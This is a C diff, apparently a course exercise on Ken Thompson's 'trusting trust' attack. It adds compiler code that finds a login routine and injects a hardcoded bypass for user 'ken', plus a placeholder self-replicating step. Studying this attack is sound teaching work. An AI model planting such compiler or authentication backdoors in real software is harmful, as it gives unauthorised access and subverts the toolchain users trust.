@@ -16,8 +16,8 @@
 static void compile(char *program, char *outname) {
     FILE *fp = fopen("./temp-out.c", "w");
     assert(fp);
-    fprintf(fp, "%s", program);
-    fclose(fp);
+    // fprintf(fp, "%s", program);
+    // fclose(fp);
 
 
     /*****************************************************************
@@ -29,27 +29,50 @@ static void compile(char *program, char *outname) {
 
     // and inject an attack for "ken":
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
-
-     
-
+    
+    static char enter[] = "\n";
+    
+    char *ptr = strstr(program, login_sig);
+    if (ptr != NULL) {
+        char *insert_ptr = strchr(ptr, '\n');
+        char tmp = *insert_ptr;
+        *insert_ptr = '\0';
+        fprintf(fp, "%s", program);
+        fprintf(fp, "%s", enter);
+        fprintf(fp, "%s", login_attack);
+        fprintf(fp, "%s", enter);
+        fprintf(fp, "%s", insert_ptr+1);
+        *insert_ptr = tmp;
+    }
+    
     /*****************************************************************
      * Step 2:
      */
-
+    
     // search for the start of the compile routine: 
     static char compile_sig[] =
             "static void compile(char *program, char *outname) {\n"
             "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
             "    assert(fp);"
             ;
-
+    
     // and inject a placeholder "attack":
     // inject this after the assert above after the call to fopen.
     // not much of an attack.   this is just a quick placeholder.
     static char compile_attack[] 
               = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
 
-
+    ptr = strstr(program, compile_sig);
+    if (ptr != NULL) {
+        static char assert_str[] = "assert";
+        char *insert_ptr = strstr(ptr, assert_str);
+        insert_ptr = strchr(insert_ptr, '\n');
+        *insert_ptr = '\0';
+        fprintf(fp, "%s", program);
+        fprintf(fp, "%s", compile_attack);
+        fprintf(fp, "%s", insert_ptr+1);
+    }
+    fclose(fp);
 
     /************************************************************
      * don't modify the rest.
